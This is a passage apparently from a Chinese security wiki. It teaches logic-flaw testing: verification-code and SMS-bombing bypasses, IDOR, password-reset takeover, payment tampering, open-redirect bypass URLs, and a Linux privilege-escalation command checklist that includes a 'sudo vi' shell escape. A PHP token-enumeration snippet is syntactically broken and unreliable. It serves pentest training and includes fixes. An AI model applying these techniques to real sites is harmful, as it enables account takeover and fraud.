短信验证码与手机号未统一验证 短信验证码未对单个手机号发送次数进行限制 短信验证码未做发送时间限制，导致短信轰炸 可能存在万能验证码 接口调用# 未授权访问敏感数据接口 短信api接口泄露被恶意调用 数据库接口泄露，导致数据可被恶意操作 逻辑漏洞利用#验证码#万能验证码： 程序员在开发验证码模块时，为了方便调用验证码验证功能是否完善，故意设置了几个万能的验证码作为测试数据。在开发结束后由于程序员的疏忽，没有删除该测试验证码数据从而导致该漏洞的产生。 验证码回传： 通过抓包的方式，可以看到验证码内容回显在了数据包中；或者通过查看网页源代码可以看到验证码中的内容，导致正确验证码可以被直接读取利用到。 删除验证码绕过： 通过抓包将验证码的值删除或者直接删除验证码参数，然后将修改后的数据包进行重放导致验证码验证被绕过。 验证码爆破： 此处验证码爆破通常是指手机短信验证的方式，由于没有对输入同一个验证码的次数做限制，并且验证码的内容太简单，例如4位或者6位的纯数字组成。可以通过Burp的Intruder模块对验证码内容进行爆破，直到匹配到正确的验证码。 验证码重放 首先，输入错误的验证码，进行抓包重放一次，观察验证的返回的数据包内容，再用正确的验证码再进行抓包重放，对比两个数据包的差异，然后根据这些差异验证码是否失效。 然后将正确的验证码发送至Burp的Intruder模进行不断的重放，比较这些数据包是否都是正确验证码时返回的一样内容，如果数据包内容一样说明存在验证码重放的漏洞。 验证码与手机号未统一匹配 首先用自己的手机收到正确验证码，在点击注册时拦截包将手机号改为其他手机号，如果成功的话就注册了别人的手机号，这是因为后端仅验证了验证码是否是正确的而没有验证验证码是否与手机匹配。 短信轰炸#尝试不断重放发送验证码的数据包，查看手机是否在短时间内收到了多条短信，是的话则存在短信轰炸漏洞，这是因为后端没有对发送手机短信做时间次数限制。 如果后端对短信验证码做了限制，那么可以尝试以下几种方式进行绕过： 删除修改cookie或者返回值，重放数据包 遍历参数发送数据包 对参数进行叠加 手机号后面加空格(%20)或者前面加其他的比如+86、逗号、分号、字母等 请求参数修改大小写，或者添加请求参数id1 多接口测试，可能登陆位置做了防护，但密码找回出没有防护 利用调用接口绕过短信轰炸限制 修改IP绕过短信轰炸限制 添加重复的手机号参数，重放数据包 越权操作#首先用一个账号登陆系统后，通过抓包修改用户参数，可以达到查看或者修改他人账号的目的，尽量对多接口或者多功能模块进行不断测试越权操作。同时也要多个账号登陆，分析对比这些账号数据包中的请求参数差异，通过修改这些存在差异的参数，看看是否能够达到越权操作的目的。 越权漏洞又分为平行越权，垂直越权和交叉越权。 平行越权：权限类型不变，权限ID改变 垂直越权：权限ID不变，权限类型改变 交叉越权：即改变ID，也改变权限 用户信息泄露#可能存在用户个人信息页面、密码找回处以及各种调用到用户信息数据的地方，通过抓包查看返回信息是否加载了一些敏感的数据信息，比如查询用户信息的时候也将用户的密码数据在数据包中回显了；或者在用户个人资料页面，通过抓包修改用户ID参数，可以通过遍历查询到其他账号的用户资料，导致用户信息泄露； 任意用户密码重置#通常发生在忘记密码处，由于系统没有严格匹配用户忘记密码时的验证方式，通过抓包修改用户参数，导致任意用户的密码都能够被重置。 比如某个忘记密码功能处采用手机号短信验证的方式来重置用户密码，如果该验证手机号没有对用户账户进行绑定，那么就可以通过输入任意手机号接收短信验证，然后就可以利用该验证码重置用户密码了。 订单金额任意修改#很多中小型的购物网站都存在订单金额任意修改漏洞。在提交订单的时候抓取数据包或者直接修改前端代码，然后对订单的金额任意修改。 经常见到的参数大多为：rmb 、value 、amount 、cash 、fee 、money 等 关于支付的逻辑漏洞这一块还有很多种思路，比如相同价格增加订单数量，相同订单数量减少产品价格，订单价格设定为负数等等。 未授权访问#有些业务的接口，因为缺少了对用户的登陆凭证的较验或者是验证存在缺陷，导致黑客可以未经授权访问这些敏感信息甚至是越权操作。 一般容易出现在文件导出下载，JSON数据页面，第三方应用页面等位置。 常见案例： 某电商后台主页面，直接在管理员web路径后面输入main.php之类的即可进入。 某航空公司订单ID枚举 某电子认证中心敏感文件下载 某站越权操作及缺陷，其主要原因是没对ID参数做cookie验证导致 实际上还有很多案例，他们都存在一个共同的特性，就是没有对用户的登陆凭证进行效验 接口无限制枚举#有些关键性的接口因为没有做验证或者其它预防机制，容易遭到枚举攻击。 常见案例： 某电商登陆接口无验证导致撞库 某招聘网验证码无限制枚举 某快递公司优惠券枚举 某电商会员卡卡号枚举 某超市注册用户信息获取 cookietoken设计存在缺陷#cookie的效验值过于简单。有些web对于cookie的生成过于单一或者简单，导致黑客可以对cookie的效验值进行一个枚举。或者通过修改cookie中的某个参数可以登陆其他用户，即cookie仿冒。 token一般是操作令牌，每个用户在登录系统时，服务器会为每个用户生成token令牌作为操作凭证。如果token设计太过于简单，那么可能会被破解；或者token没有设置过期的时间，使得用户token不唯一，导致用户token存在被盗用的风险。 找回密码存在设计缺陷#auth设计缺陷 经常研究逻辑漏洞的人可能会对以下URL很熟悉 www.xxx.com/resetpassword.php?id=MD5 用户修改密码时，邮箱中会收到一个含有auth的链接，在有效期内用户点击链接，即可进入重置密码环节。而大部分网站对于auth的生成都是采用rand()函数，那么这里就存在一个问题了，Windows环境下rand()最大值为32768，所以这个auth的值是可以被枚举的。 如下面这个代码可以对auth的值做一个字典。 $a=0;for ($a=0;$a=32768;$a++) $b=md5($a); echo \\r ; echo $b; 然后重置某个账号，并且对重置链接内的auth进行枚举。 签约漏洞# 使用A手机登陆账号A打开要测试的业务，点击自动续费，支付时停留在支付界面。 使用B手机登陆账号A打开要测试的业务，点击自动续费，支付时停留在支付界面。 重复多台手机进行同样操作 A手机点击支付进行签约 A手机支付成功后，在第三方APP中解除自动续费 B手机进行支付，支付成功后在第三方APP中解除自动续费 全部支付完成后，系统就会为你开通相应的次数，由于提前打开了支付界面，所以金额都是享受到新用户首月优惠的金额。 最终的效果是，一个账户享受到了多次新用户首月优惠金额，即证明漏洞的存在。 通常这种漏洞比较容易出现在活动页面的会员优惠开通，而且要考虑到支付后要比正常购买优惠才算是漏洞。 会员升级# 使用A手机登陆账号A，并且开通会员。开通超级会员，进入到升级页面，进行补齐差价开通。 使用B手机登陆账号A，点击开通超级会员，进入到升级页面，进行补齐差价开通。 A手机进行支付，B手机进行支付。服务器认为你补齐了多个月份的超级会员，然后到账多次。 其实这个和签约漏洞的原理差不多，绕过了支付后服务器才去校验是否可以升级的逻辑。 订单关闭# 使用优惠券创建一个订单，停留在支付界面 关闭订单，返回优惠券 使用优惠券再次创建订单；把第一个未支付的订单进行支付 商品从关闭，重新进入到了代发货的阶段，优惠券却仍然存在，即证明漏洞存在 支付金额# 有些业务在支付时会忽略分以后的单位，这时候就导致了存在分单位的金额也可以生成订单 比如0.0190.02，在支付时客户端给服务器传了0.019元的订单。而第三方付支通常最小的单位为分 这就导致了返回的金额会吧后面的9屏蔽掉，只返回0.01（也有些直接四舍五入变成0.02的） 当你支付完0.01后，第三方会通知服务器支付成功，而服务器那边生成的是0.019，可能这个软件的侨胞最小单位也是分，四舍五入变成了0.02 int整数溢出# 注意：在做溢出测试时，有可能导致目标服务器宕机，需要向授权单位申请授权后才能进行测试。 int的范围是-2147483648~2147483647。你可以把它看作是一个循环，当超过最大值后就重新从0开始计算 比如2147483649-2147483647。有时候支付里面没有负数所以从0开始计算了 当支付金额为2147483649时，支付金额就变成了1，即2147483649-21474836481 支付的时候可以直接吧金额改成这个值，在测试商品时也可以让总价格为这个数。2147483648物品单价+1物品数量 以上的做法目的，简单的来说就是通过整数溢出来修改支付金额或者购买商品数量。 突破时间限制#一些网站中的限时活动设置了活动时间范围，可以通过抓包尝试更改时间参数为活动未限定范围内的。 前端验证#前端加密、后端解密校验。比如在用户登录时，通过抓包发现用户密码被加密传输了，可以利用一些解密工具进行破解，如：Burp解密或者一些在线解密网站。 暴力破解撞库#首先在没有验证码或者验证码可以被绕过的情况下，尝试5次或者10次账号密码登陆，检测目标是否封禁账户，如果没有封禁规则，可以不断进行爆破。采用账号密码爆破，对于一些商城、应用、政府、学校采用撞库方式判断是否存在该账号（需要准备各类字典：手机号撞库、邮箱撞库、姓名撞库）。 密码找回# 通过邮箱找回密码，访问链接重置密码，输入新密码后提交抓包，虽然有token，但是依然可以直接修改用户ID进而修改他人密码 通过他人手机号找回密码，抓包，将他人手机号替换为自己的手机号，获取验证码，提交后修改密码 通过自己手机号找回密码，获取验证码后抓包，将数据包中的用户ID改为他人账号ID，提交后成功修改他人密码 通过邮箱找回密码，URL链接中修改用户ID为他人，邮箱不变，之后通过链接可以将他人账户绑定为自己的邮箱，之后通过邮箱找回密码 任意url跳转#url跳转漏洞也叫开发重定向漏洞，可以把用户重定向到攻击者自己构造的页面去，简单的说就是可以跳转到任意指定的url。一般出现在验证跳转、sso登陆等位置。 服务端未对传入的跳转url变量进行检查和控制，可能导致可恶意构造任意一个恶意地址，诱导用户跳转到恶意网站。 危害： 网站钓鱼 配合CSRF操作危险请求 配合XSS执行JS盗取cookie 配合浏览器漏洞（CVE-2018-8174） http://www.xxx.com?url=https://www.baidu.com 替换url参数后能够跳转到对应页面，但是一些网站可能会对url跳转做限制，可以尝试绕过bypass 1.利用问号绕过限制,最终跳转到京东页面url=https://www.baidu.com?www.jd.com2.利用@绕过限制,最终跳转到京东页面url=https://www.baidu.com@www.jd.com3.利用斜杆反斜杠绕过限制4.利用#绕过限制url=https://www.baidu.com@www.jd.com5.利用子域名绕过6.利用畸形url绕过7.利用跳转IP绕过 支付逻辑漏洞#在支付环节中由于逻辑不严谨而产生的漏洞称为支付漏洞。 测试思路#只要有参数，都可以修改，都有可能出现问题。 通常使用两个账号来对比测试，这样可以更快发现可疑参数 订单模块# 下单之后修改商品价格 下单之后更改数量设为负数，产生正负逻辑 并发购买是否出现逻辑问题 商品为0，是否存在购买的可能 生成订单时修改订单金额 结算模块# 优惠券重复利用 修改结算状态 更改支付API或者支付模式 伪造成功结算请求 退货模块# 更改货物状态 更改退货价格 收货模块# 绕过客户直接确认收货 边界值问题#正常的逻辑是用户购买商品，然后价格累加得到一个总价进行扣款。这个时候就会产生逻辑问题：如果说用户购买的商品是负数了，那么计算的总数就是负数。反过来钱给用户 顺序执行缺陷#正常的逻辑是a-b-c-d 循环渐进的进行流程操作。这个时候就会产生逻辑问题：可以直接从中绕过某一个过程进入到下一步操作。如果说有一项是支付的操作，那么也就会产生支付绕过，如果说有一项是验证机制，就会绕过验证直接进入下一步。 金额直接传输导致篡改#直接对下单的金额进行修改值，这里可以使用fd或者burp抓包 确定支付之后还可以加入购物车#把商品放入购物车点击下单支付，会跳转到微信，支付宝等第三方支付平台。这个时候还可以继续在购物车中加入商品，支付结束之后，商家发放的商品是现在的购物车里面的东西。 请求重放#购买成功之后，继续重放请求，可以让购买的商品一直增加。购买成功之后，会有一个银行对商户网站跳转的过程，如果反复进行操作，有几率会导致商品反复购买和增加，但是不需要付更多的钱。 请求参数干扰#金钱做了签名认证之后，修改后不通过，但是在里面仍然会有一个参数对金额产生影响导致问题产生。 订单替换#订单替换发生在支付之后的事件处理，同时向服务器发起二次支付请求一个多一个少，支付金额少的，然后支付之后进行替换，告知服务器订单支付完成，并且过程可以反复的回放。 欺诈#需要两个收款人，一个是正常的商家，一个是伪造的商家 单位替换#产生在paypal类似的国际支付的场景。 用户替换#在支付过程中发生用户替换现象，首先登陆自己的账户，然后取得另外一个人的账户名等有效信息，在业务流程中用对方的用户名替换自己的用户名，用对方的余额购买完成后，再替换自己的账户名，这样就形成别人的钱买自己的东西 强制攻击#强制攻击发生在暴力破解的情况下，如果一个商家运用一个自己的网店，接入第三方支付接口，由于设计上的不当导致商家与第三方支付约定的密钥Key可以单独被MD5加密，导致可以使用MD5碰撞技术对密钥进行破解，攻击者可以设计简单的密钥加密信息使得MD5加密是可以用MD5碰撞技术进行暴力破解。 秘钥泄漏#内置支付功能的app为了设计上的方便有可能会把Md5或者是RSA的私钥泄漏导致攻击者反编译apk之后获取密钥信息使得交易信息可以被篡改。13.函数修改：apk反编译之后的函数修改，可能导致商家在最后一步向支付方提交订单时未验证信息的准确性，仍然被篡改。 修复建议# 生成数据签名，对用户金额和订单签名 敏感参数不要放在url中 服务端校验过滤客户端提交的参数 在服务端计算金额的时候，一定要判断是否为正数 支付过程中加一个服务器生成的key，用户校验参数有没有被篡改 用url传递相关参数，后端进行数字验证 订单金额和充值接口返回的数据进行校验 提交订单时后台判断单价是否与数据库中相符，若不符则返回数据 支付时应从服务器拉取数据，而不是直接读取客户端的值"},{"path":"/wiki/内网/提权/Lin_信息收集.html","content":"项目（Item） 命令检查项（CommandCheck） 目的（Purpose） 注意事项（Notes） 风险等级（LowHigh） 行动建议（概念级） 系统与内核（System Kernel） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);uname -a/font 确定 OS 发行版、运行内核版本 vs 已安装内核版本（检测内核漏洞可能性） 关注内核版本是否存在已知提权漏洞（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);CVE-2021-4034/font 对应内核版本范围） High 对比 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);exploit-db/font 排查是否存在匹配内核漏洞；优先更新内核 当前身份与登录（Current Identity Logins） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);id/font；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);last/font 定位用户账户、最近登录记录，识别潜在闲置账户或特权账户（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);uid=0/font 的 root） 检查是否存在 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo/font 权限用户或 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);wheel/font 组成员 High 审计非活跃账户，限制特权用户登录来源 SUIDSGID 文件（SUIDSGID Files） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);find / -perm -4000 2/dev/null/font；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);find / -perm -2000 2/dev/null/font 查找具有 SUIDSGID 权限的二进制文件（可能被滥用提权） 结合 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);GTFOBins/font 检查文件是否存在已知滥用方法（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);find/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);nmap/font 等） High 移除不必要的 SUIDSGID 权限，使用 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);chmod u-s/font Capabilities 权限 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);getcap -r / 2/dev/null/font 查找具有 POSIX Capabilities 的文件（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);CAP_SYS_ADMIN/font 可能导致提权） 关注 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);cap_setuid+ep/font 等高风险权限，例如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);python3 = cap_setuid+ep/font High 使用 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);setcap -r 文件/font 移除危险 Capabilities 进程信息（Processes） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);ps -eo pid,user,cmd,exe/font 识别特权进程（如 root 运行的服务）及可执行文件路径 检查进程是否存在命令注入漏洞或可写的可执行文件 Medium 限制进程权限，使用 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);chroot/font 或容器隔离高危服务 文件系统权限（Filesystem） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);ls -la //font；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);mount/font 检查粘性位（sticky bit）、font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);noexec/fontfont style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);nosuid/font 挂载选项、可写目录（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/tmp/font 权限） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/tmp/font 若为 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);rwx/font 且无粘性位，可能存在文件覆盖风险；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/etc/passwd/font 可写性需重点关注 High 对 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/tmp/font 设置 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sticky bit/font，对系统目录启用 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);nosuid/font 计划任务（Cron Scheduled Tasks） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);crontab -l/font；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);cat /etc/crontab/font 检查计划任务是否存在高风险脚本（如所有者为 root 但可被低权限用户修改的脚本） 关注 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);* * * * */font 高频任务，及 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sh /tmp/script.sh/font 等使用相对路径的命令 High 限制计划任务脚本权限为 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);root:root 600/font，避免使用相对路径 环境变量（Environment） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);echo $PATH/font；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);env/font 检查 PATH 是否包含可写目录（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/tmp/font），可能导致命令劫持 若 PATH 中可写目录位于系统目录前（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/tmp:/usr/bin/font），风险更高 Medium 清理 PATH 中的可写目录，使用绝对路径执行命令 Sudo 配置（Sudo Privilege Escalation） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo -l/font 查找 sudo 配置错误（如无需密码的命令）及允许执行的命令（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo vi/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo find/font） 结合 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);GTFOBins/font 检查允许的命令是否存在提权方法（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo vi - :!bash/font） High 最小化 sudo 权限，禁止无密码执行敏感命令 认证日志（Auth Logs） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);cat /var/log/auth.log 2/dev/null/font 审计认证事件（如失败登录、sudo 提权尝试），识别可疑提权行为 关注 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo: PAM authentication failure/font 或 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);root : TTY=pts/0 ; COMMAND=/bin/bash/font Medium 启用日志审计工具（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);auditd/font），监控敏感命令执行 已安装包（Installed Packages） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);dpkg -l/font（Debian）；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);rpm -qa/font（RHEL） 列出已安装包版本，排查已知漏洞版本（如 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);polkit/font 漏洞对应版本） 结合 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);CVE Details/font 或 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);nessus/font 检查包版本是否存在本地提权漏洞 High"},{"path":"/wiki/Web知识点/逻辑越权/越权.html","content":"逻辑越权 水平垂直 垂直越权:添加用户 前提条件:获取的添加用户的数据包怎么来的数据包: 1.普通用户前端有操作界面可以抓取数据包 2.通过网站源码本地搭建自己去模拟抓取 3.盲猜 逻辑漏洞简介逻辑漏洞就是指攻击者利用业务功能上的设计缺陷，获取敏感信息或破坏业务的完整性。一般出现在密码修改、越权访问、密码找回、交易支付金额等功能处。 逻辑漏洞的破坏方式并非是向程序添加破坏内容，而是利用逻辑处理不严密或代码问题或固有不足。操作上并不影响程序运行，在逻辑上是顺利执行的。 这种漏洞一般的防护手段或设备无法阻止，因为走的都是合法流量。也没有防护标准。 逻辑漏洞分类越权漏洞 密码修改 密码找回 验证码****漏洞 支付漏洞 短信****轰炸 投票积分抽奖 逻辑漏洞重要性常见的OWASP漏洞，通过漏洞扫描工具，大多支持自动化或者半自动化扫描出来；并且传统的安全防御设备和措施收效甚微； 但逻辑漏洞属于和系统自身功能和逻辑有关系的漏洞，每一家的漏洞出现可能存在一定的独特性，很难复制或者通过规则通过脚本扫描，因此逻辑漏洞大多需要配合代码审计和手动测试才可发现相关漏洞，也是工具无法完全替代人所作的一类漏洞； 越权漏洞概念越权访问（Broken Access Control，简称BAC）是Web应用程序中一种常见的漏洞，由于其存在范围广、危害大，被OWASP列为Web应用十大安全隐患的第二名。 该漏洞是指应用在检查授权时存在纰漏，使得攻击者在获得低权限用户账户后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限。越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定，一旦权限验证不充分，就易致越权漏洞。 其中越权访问分为： 水平越权 垂直越权 分类水平越权：相同级别（权限）的用户或者同一角色中不同的用户之间，可以越权访问、修改或者删除其他用户信息的非法操作。如果出现此漏洞，可能会造成大批量数据的 泄露，严重的甚至会造成用户信息被恶意篡改。 **水平越权：**指攻击者尝试访问与他拥有相同权限的用户资源。例如，用户A和用户B属于同一角色，拥有相同的权限等级，他们能获取自己的私有数据（数据A和数据B），但如果系统只验证了能访问数据的角色，而没有对数据做细分或者校验，导致用户A能访问到用户B的数据（数据B），那么用户A访问数据B的这种行为就叫做水平越权访问 垂直越权 ：就是不同级别之间的用户或不同角色之间用户的越权，比如普通用户可以执行管理员才能执行的功能。 垂直越权：由于后台应用没有做权限控制，或仅仅在菜单、按钮上做了权限控制，导致恶意用户只要猜测其他管理页面的URL或者敏感的参数信息，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。 产生原因水平越权和垂直越权的定义不一样，但漏洞原理是一样的，都是账户体系上在判断权限时不严格导致存在绕过漏洞，这一类的绕过通常发生在cookie验证不严、简单判断用户提交的参数，归根结底，都是因为这些参数是在客户端提交，服务端未严格校验。 1.通过隐藏URL 实现控制访问有些程序的管理员的管理页面只有管理员才显示，普通用户看不到，利用 URL 实现访问控制，但URL 泄露或被恶意攻击者猜到后，这会导致越权攻击。 2.直接对象引用 这种通过修改一下参数就可以产生水平越权，例如查看用户信息页面 URL 后加上自己的 id 便可查看，当修改为他人的 ID 号时会返回他人的信息，便产生了水平越权。 3.多阶段功能 多阶段功能是一个功能有多个阶段的实现。例如修改密码，可能第一步是验证用户身份信息，号码验证码类的。 当验证成功后，跳到第二步，输入新密码，很多程序会在这一步不再验证用户身份，导致恶意攻击者抓包直接修改密码。 4.静态文件 很多网站的下载功能，一些被下载的静态文件，例如 pdf、word、xls 等，可能只有付费用户或会员可下载，但当这些文件的 URL 地址泄露后，导致任何人可下载，如果知道 URL 命名规则，则会便利服务器的收费文档进行批量下载。 5.平台配置错误 一些程序会通过控件来限制用户的访问，例如后台地址，普通用户不属于管理员组，则不能访问。但当配置平台或配置控件错误时，就会出现越权访问。 修复建议1、前后端同时对用户输入信息进行校验，双重验证机制 2、 执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限 3、特别敏感操作可以让用户再次输入密码或其他的验证信息。 4、可以从用户的加密认证 cookie 中获取当前用户 id，防止攻击者对其修改。 或在 session、cookie 中加入不可预测、不可猜解的 user 信息。 5、直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理 6、永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤 密码重置漏洞概念什么是密码重置？ 顾名思义，就是修改掉原来的密码；密码重置的途径有哪些？ 1、一个网站，一般我们可以登录进入个人中心，直接修改密码； 2、当我们忘记密码是还可以使用系统自带的密码找回功能进行密码修改； 什么是密码重置漏洞？ 密码重置这个功能本身没有问题，但如过对密码重置功能的验证机制不够完善就形成了漏洞； 成因一、基于修改密码的 如果后台没有对旧密码进行验证，就直接让输入新密码 1、第一种方式，如果存在CSRF漏洞，我们就可以利用一波; 2、如果存在越权漏洞，就可以直接修改其他人的密码; 3、点击修改后抓包测试，观察数据库包有没有验证类似cookie随机数，如果没有的话，可以尝试修改用户名、手机号或者uid来尝试重置其他密码; 如果后台是通过向注册手机或者注册邮箱来重置密码的，关于验证码的漏洞我们都可以尝试，这种方式的前提是你已经通过某种方式进入到了对方的个人中心，所以意义不太大. 二、基于找回密码的 一般情况下当我们点击找回密码的时候都是通过验证手机号或者验证邮箱，这就又变成了验 证码的问题; \\1.验证码发送后前端返回 \\2. 未限制验证码次数导致验证码爆破 \\3. 验证码有规律或可控 \\4. 验证码被放在返回包中 \\5. 输入验证码后通过修改响应包的状态来重置密码 \\6. 验证码为空（原理就是后台未考虑验证码为空的情况，直接就是如果存在，然后下面仅 判断了存在的情况）绕过或者万能验证码 \\7. 拦截数据包，发送验证码时可以向多个手机号发送验证码，这个时候就可以添加个云短信，直接接受验证码完成修改等等 密码找回漏洞密码找回是出现逻辑漏洞问题最多的一个功能，因为它的交互流程最多，目前找回密码的方式比较常见的有邮箱验证码、手机验证码以及密保问题， 1.输入用户名邮箱收机阶段 交互过程：即输入要重置的账号信息，点击确定时，大部分应用会直接从数据库中读取用户邮箱和手机信息，并且发送验证码，还有部分程序在输入用户名后，会提示使用手机还是邮箱找回密码。 在提交的时候可以直接抓包修改手机或者邮箱参数，这时如果后端没有做验证，原本发送给账号A的验证码就会发送到被我们篡改的手机或者邮箱上，利用接收到的验证码即可重置密码。 2.填写验证码和新密码阶段 填写验证码和新密码就意味着我们已经拿到了验证码或者重置密码的URL，这里存在的 主要问题有： （1）验证凭证较简单，可以暴力破解。 目前大多数手机短信重置密码的验证码都是4位或者6位数字，如果提交验证码的地方没有对这个验证码进行错误次数限制，则会存在可以爆破的问题，这是目前最常见的一种找回密码漏洞利用方式。 （2）验证凭证算法简单，凭证可预测。 部分网站找回密码的Token是根据当前用户的“用户名+邮箱”或者时间戳进行一次MD5后生成，这就存在一定得预测性，利用自己写的算法去碰撞即可拿到争取到的重置密码凭证。 （3）验证凭证直接保存在源码里。 目前这种比较少，不过也存在一定比例，一种是在点击发送验证码的时候就可以直接在源码里看到给当前用手机或者邮箱发送过去的验证码，还有一种是在输入验证码的时候， 源码里面就直接保存了正确的验证码。 3.发送新密码阶段 凭证未绑定用户：我们在找回密码的时候，发送到邮箱的链接通常是如下这个样子：http://www.xxx.com/user.php?m=repwduid=用户IDkey凭证密钥email邮箱 当请求这个链接的时候，后端程序根据uid和key对应上了从而判断这个找回密码的链接是否有效，但是在将新密码提交到服务器的时候，服务器端并没有判断当前这个key是否跟uid或者email匹配，而是直接修改掉了uid或者email指定的用户密码，这样我们只要拦截修改密码的请求包，将里面的用户参数修改成我们要篡改密码的用户账号即可。 修复建议1.接收验证码的邮箱和手机号不可由用户控制，应该直接从数据库中读取出来。 2.加强验证凭证复杂度，防止被暴力破解。 3.限制验证凭证错误次数，单个用户在半个小时内验证码错误三次，半小时内禁止找回密码。 4.验证凭证设置失效时间。 5.验证凭证不要保存在页面。 6.输入用户邮箱或ID、手机号取验证凭证的地方需要设置验证码防止短信炸弹和批量找回等。 7.验证凭证跟用户名、用户ID、用户邮箱绑定，找回密码时验证当前凭证是否是当前用户的。 验证码漏洞漏洞概念：验证码机制主要用于用户身份识别，常见可分为图片验证码、数字验证码、滑动验证码、短信验证码、邮箱验证码等； 漏洞成因：服务端未对验证时间、次数作出限制，存在爆破的可能性。验证码常用在批量注册，任意用户登录场景。 漏洞分类：1、前端验证绕过 原理：前端验证码绕过一般是前端JavaScript脚本生成验证码，验证的工作在前端进行； 思路：直接删除相对应的部份的代码即可，要求能够大概看懂前端的代码； 2、后端验证码未刷新 原理：后端绕过情况1：后端代码在逻辑上存在问题，验证失败时，验证码不过期，可以继续做认证（也算作逻辑漏洞）； 思路：这类情况需要Burp抓包测试验证； 实战：东塔攻防世界-后端验证码绕过 3、TOKEN验证可提取 思路：利用burp工具，可以每次自动提取后台返回的token值，用于下一次的爆破使用； 支付漏洞原理支付漏洞，是一种很简单的逻辑漏洞，通过抓包简单修改数据包即可实现。 世界上的公司分为俩种，一种是还没被黑客攻击过的，另一种就是已经被 黑客 攻击过的。 所以企业也越来越重视网络安全这块，这样的支付漏洞就那么好找了……. 商户网站接入支付结果有两种方式，一种是通过浏览器进行跳转通知，一种是服务器端异步通知； Ø 浏览器跳转 基于用户访问的浏览器，如果用户在银行页面支付成功后，直接关闭了页面，并未等待银行跳转到支付结果页面，那么商户网站就收不到支付结果的通知，导致支付结果难以处理。而且浏览器端数据很容易被篡改而降低安全性； Ø 服务器端异步通知 